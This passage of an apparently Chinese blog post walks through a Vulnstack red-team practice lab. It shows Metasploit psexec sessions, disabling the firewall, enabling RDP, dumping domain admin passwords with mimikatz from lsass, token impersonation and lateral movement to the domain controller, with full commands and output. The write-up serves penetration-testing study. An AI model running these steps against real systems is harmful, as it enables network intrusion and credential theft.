PowerShell target\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Executing the payload...\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Service start timed out, OK \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e running a command \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e non-service executable...\n[*] Started bind TCP handler against \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e4444\u003c/span\u003e\n[*] Sending stage (\u003cspan class=\"hljs-number\"\u003e176198\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e) to \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e\n[*] Meterpreter session \u003cspan class=\"hljs-number\"\u003e3\u003c/span\u003e opened (\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.100\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e42597\u003c/span\u003e -\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.20\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e4444\u003c/span\u003e via session \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e) at \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e51\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e45\u003c/span\u003e +0800                                                                                                                          \n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emeterpreter \u003e getuid\nServer username: NT AUTHORITY\\SYSTEM\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e关闭防火墙以及开启远程桌面\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# 关闭防火墙\u003c/span\u003e\nC:\\Windows\\system32\u003enetsh advfirewall \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e allprofiles state off\nnetsh advfirewall \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e allprofiles state off\n\u003cspan class=\"hljs-comment\"\u003e# 注册表开启3389端口\u003c/span\u003e\nC:\\Windows\\system32\u003eREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u003cspan class=\"hljs-string\"\u003e\" \"\u003c/span\u003eServer /v fDenyTSConnections /t REG_DWORD /d \u003cspan class=\"hljs-number\"\u003e00000000\u003c/span\u003e /f\nREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u003cspan class=\"hljs-string\"\u003e\" \"\u003c/span\u003eServer /v fDenyTSConnections /t REG_DWORD /d \u003cspan class=\"hljs-number\"\u003e00000000\u003c/span\u003e /f\nThe operation completed successfully.\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e测试连接远程桌面（记得\u003ccode\u003e!\u003c/code\u003e前要加斜杠来转义）\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image47.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e连接成功\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003eMSF\u003c/code\u003e加载\u003ccode\u003emimikatz\u003c/code\u003e来抓取密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eC:\\Windows\\system32\u003eexit\nexit\nmeterpreter \u003e load kiwi\nLoading extension kiwi...\n  .\u003cspan class=\"hljs-comment\"\u003e#####.   mimikatz 2.2.0 20191125 (x86/windows)\u003c/span\u003e\n .\u003cspan class=\"hljs-comment\"\u003e## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\u003c/span\u003e\n \u003cspan class=\"hljs-comment\"\u003e## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\u003c/span\u003e\n \u003cspan class=\"hljs-comment\"\u003e## \\ / ##       \u003e http://blog.gentilkiwi.com/mimikatz\u003c/span\u003e\n \u003cspan class=\"hljs-string\"\u003e'## v ##'\u003c/span\u003e        Vincent LE TOUX            ( vincent.letoux@gmail.com )\n  \u003cspan class=\"hljs-string\"\u003e'#####'\u003c/span\u003e         \u003e http://pingcastle.com / http://mysmartlogon.com  ***/\n\n[!] Loaded x86 Kiwi on an x64 architecture.\n\nSuccess.\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003emimikatz\u003c/code\u003e 需要在\u003ccode\u003ex64\u003c/code\u003e下运行，我们ps打印正在运行程序\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emeterpreter \u003e ps\n            \nProcess \u003cspan class=\"hljs-type\"\u003eList\u003c/span\u003e\n============  \n\n PID   PPID  Name                          Arch  Session  User                          Path \n ---   ----  ----                          ----  -------  ----                          ----   \n \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e     \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e     [System Process]   \n \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e     \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e     System                        x64   \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e \n \u003cspan class=\"hljs-number\"\u003e300\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e616\u003c/span\u003e   svchost.exe                   x64   \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\svchost.exe\n \u003cspan class=\"hljs-number\"\u003e320\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e616\u003c/span\u003e   SLsvc.exe                     x64   \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e        NT AUTHORITY\\NETWORK SERVICE  C:\\Windows\\System32\\SLsvc.exe\n \u003cspan class=\"hljs-number\"\u003e408\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e     smss.exe                      x64   \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\smss.exe\n \u003cspan class=\"hljs-number\"\u003e628\u003c/span\u003e   \u003cspan class=\"hljs-number\"\u003e536\u003c/span\u003e   lsass.exe                     x64   \u003cspan class=\"hljs-number\"\u003e0\u003c/span\u003e        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\lsass.exe \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e迁移到\u003ccode\u003elsass.exe\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emeterpreter \u003e migrate \u003cspan class=\"hljs-number\"\u003e628\u003c/span\u003e\n[*] Migrating \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e2720\u003c/span\u003e to \u003cspan class=\"hljs-number\"\u003e628.\u003c/span\u003e..\n[*] Migration completed successfully.\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e抓取密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emeterpreter \u003e creds_all                        \nkerberos credentials                          \n====================                                                                                                                                                                    \n                                              \nUsername       Domain    Password    \n--------       ------    --------             \n(null)         (null)    (null)\nAdministrator  TEST.ORG  zxcASDqw123!!                                                      \nAdministrator  WIN2008   123qwe!ASD\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e抓取到域的管理员账户密码，密码为 \u003ccode\u003ezxcASDqw123!!\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e获取域控shell\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e上边抓到了域管理员的密码，我们使用\u003ccode\u003epsexec\u003c/code\u003e连接\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsf6 auxiliary(server/socks_proxy) \u003e use exploit/windows/smb/psexec                                                     \nmsf6 exploit(windows/smb/psexec) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e SMBUSER administrator  \nmsf6 exploit(windows/smb/psexec) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e rhosts \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\nmsf6 exploit(windows/smb/psexec) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e SMBPass zxcASDqw123!!\nmsf6 exploit(windows/smb/psexec) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e lport \u003cspan class=\"hljs-number\"\u003e4445\u003c/span\u003e\nmsf6 exploit(windows/smb/psexec) \u003e run\n\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Connecting to the server...\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Authenticating to \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e user \u003cspan class=\"hljs-string\"\u003e'administrator'\u003c/span\u003e...\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Selecting PowerShell target\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Executing the payload...\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Service start timed out, OK \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e running a command \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e non-service executable...\n[*] Started bind TCP handler against \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e4445\u003c/span\u003e\n[*] Exploit completed, but no session was created.\nmsf6 exploit(windows/smb/psexec) \u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e没连上，挠头\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e换别的工具，新找到的一个工具，发现挺好用的\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/XiaoliChan/wmiexec-Pro\"\u003ehttps://github.com/XiaoliChan/wmiexec-Pro\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e测试是否成功（密码的\u003ccode\u003e!\u003c/code\u003e号前面记得加上斜杠转义）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eproxychains python3 wmiexec-pro.py TEST/administrator:zxcASDqw123\\!\\!@\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eexec\u003c/span\u003e-command -command \u003cspan class=\"hljs-string\"\u003e\"ipconfig\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e[+] Getting command results...\n\nWindows IP Configuration\n\nEthernet adapter Ethernet0:\n\n   Connection-specific DNS Suffix  . : \n   Link-local IPv6 Address . . . . . : fe80::1fa:2f8:97ac:\u003cspan class=\"hljs-number\"\u003e1160\u003c/span\u003e%\u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e\n   IPv4 Address. . . . . . . . . . . : \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\n   Subnet Mask . . . . . . . . . . . : \u003cspan class=\"hljs-number\"\u003e255.255\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.255\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\n   Default Gateway . . . . . . . . . : \n\nTunnel adapter isatap.{22AC77BB-\u003cspan class=\"hljs-number\"\u003e4205\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e4120\u003c/span\u003e-89CB-C8F5240403E0}:\n\n   Media State . . . . . . . . . . . : Media disconnected\n   Connection-specific DNS Suffix  . : \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功获取到域控IP\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e我们将其防火墙关闭\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eproxychains python3 wmiexec-pro.py TEST/administrator:zxcASDqw123\\!\\!@\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e firewall -firewall-profile disable\n[+] All firewall profile has been disable.\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e开启3389端口（RDP）服务\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eproxychains python3 wmiexec-pro.py TEST/administrator:zxcASDqw123\\!\\!@\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e rdp -enable\n[+] Enabling RDP services \u003cspan class=\"hljs-keyword\"\u003eand\u003c/span\u003e setting up firewall.\n[+] RDP port: \u003cspan class=\"hljs-number\"\u003e3389\u003c/span\u003e\n[+] RDP enabled!\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e窃取管理员\u003ccode\u003etoken\u003c/code\u003e令牌\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003e\u003cspan class=\"hljs-comment\"\u003e# meterpreter \u003e use incognito\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# meterpreter \u003e list_tokens -u  \u003c/span\u003e\nDelegation Tokens Available\n========================================\nNT AUTHORITY\\LOCAL SERVICE\nNT AUTHORITY\\NETWORK SERVICE\nNT AUTHORITY\\SYSTEM\nTEST\\administrator\nWIN2008\\Administrator\n\n\u003cspan class=\"hljs-comment\"\u003e# meterpreter \u003e impersonate_token \"TEST\\administrator\"\u003c/span\u003e\n[+] Delegation token available\n[+] Successfully impersonated user TEST\\administrator\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e尝试连接远程桌面\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eproxychains rdesktop \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e -p zxcASDqw123\\!\\! -u administrator -v     \n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so\u003cspan class=\"hljs-number\"\u003e.4\u003c/span\u003e\n[proxychains] DLL init: proxychains-ng \u003cspan class=\"hljs-number\"\u003e4.17\u003c/span\u003e\nis_wm_active(): WM name: Xfwm\nConnecting to server using NLA...\n[proxychains] Strict chain  ...  \u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1080\u003c/span\u003e  ...  \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e3389\u003c/span\u003e  ...  OK\nCore(warning): Certificate received \u003cspan class=\"hljs-keyword\"\u003efrom\u003c/span\u003e server \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e NOT trusted by this system, an exception has been added by the user to trust this specific certificate.\nTLS  Session info: (TLS1\u003cspan class=\"hljs-number\"\u003e.2\u003c/span\u003e)-(DHE-CUSTOM1024)-(RSA-SHA1)-(AES-\u003cspan class=\"hljs-number\"\u003e256\u003c/span\u003e-GCM)\n\nFailed to initialize NLA, do you have correct Kerberos TGT initialized ?\nFailed to connect using NLA, trying \u003cspan class=\"hljs-keyword\"\u003ewith\u003c/span\u003e SSL\n[proxychains] Strict chain  ...  \u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e1080\u003c/span\u003e  ...  \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e3389\u003c/span\u003e  ...  OK\nFailed to connect, CredSSP required by server (check \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e server has disabled old TLS versions, \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e yes use -V option).\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e失败\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e再尝试\u003ccode\u003ePsexec\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emsf6 auxiliary(server/socks_proxy) \u003e use exploit/windows/smb/psexec                                                     \nmsf6 exploit(windows/smb/psexec) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e SMBUSER administrator  \nmsf6 exploit(windows/smb/psexec) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e rhosts \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\nmsf6 exploit(windows/smb/psexec) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e SMBPass zxcASDqw123!!\nmsf6 exploit(windows/smb/psexec) \u003e \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e lport \u003cspan class=\"hljs-number\"\u003e4445\u003c/span\u003e\nmsf6 exploit(windows/smb/psexec) \u003e run\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Connecting to the server...\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Authenticating to \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eas\u003c/span\u003e user \u003cspan class=\"hljs-string\"\u003e'administrator'\u003c/span\u003e...\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Selecting PowerShell target\n[*] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Executing the payload...\n[+] \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e - Service start timed out, OK \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e running a command \u003cspan class=\"hljs-keyword\"\u003eor\u003c/span\u003e non-service executable...\n[*] Started bind TCP handler against \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e4445\u003c/span\u003e\n[*] Sending stage (\u003cspan class=\"hljs-number\"\u003e176198\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e) to \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\n[*] Meterpreter session \u003cspan class=\"hljs-number\"\u003e4\u003c/span\u003e opened (\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.100\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e51849\u003c/span\u003e -\u003e \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.93\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e4445\u003c/span\u003e via session \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e) at \u003cspan class=\"hljs-number\"\u003e2024\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e11\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e28\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e15\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e58\u003c/span\u003e:06 +0800\nmeterpreter \u003e \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功了，拿到了域控的\u003ccode\u003eshell\u003c/code\u003e ！！\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e最后发现可以先远程到win2008然后再远程到域控\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image48.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch2\u003e读取Flag文件\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eC:\\Users\\Administrator\\Documents\u003e\u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e\n Volume \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e drive C has no label.\n Volume Serial Number \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e D6DC-065A\n\n Directory of C:\\Users\\Administrator\\Documents\n\n\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e31\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e AM    \u0026#x3C;DIR\u003e          .\n\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e31\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e52\u003c/span\u003e AM    \u0026#x3C;DIR\u003e          ..\n\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e31\u003c/span\u003e/\u003cspan class=\"hljs-number\"\u003e2019\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e12\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e AM                \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e flag.txt\n               \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e File(s)             \u003cspan class=\"hljs-number\"\u003e13\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e\n               \u003cspan class=\"hljs-number\"\u003e2\u003c/span\u003e Dir(s)  \u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e368\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e212\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e992\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e free\n\nC:\\Users\\Administrator\\Documents\u003e\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e flag.txt\n\u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e flag.txt\nthis \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e flag!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%B8%89)/image49.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003eew代理使用，更熟悉MSF框架，以及域内有linux和windows两种系统渗透，其实除了爆破还有NTLM中继的思路，但是还没有实现，接着就去实现NTLM中继\u003c/p\u003e","title":"Vulnstack - ATT\u0026CK红队评估实战靶场(三)","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["Vulnstack","Windows靶机","综合靶场"],"categories":"靶机"}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"Vulnstack红队评估实战靶场(三)"},"buildId":"oMFqh6VxQZoYSF5uQbT2C","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>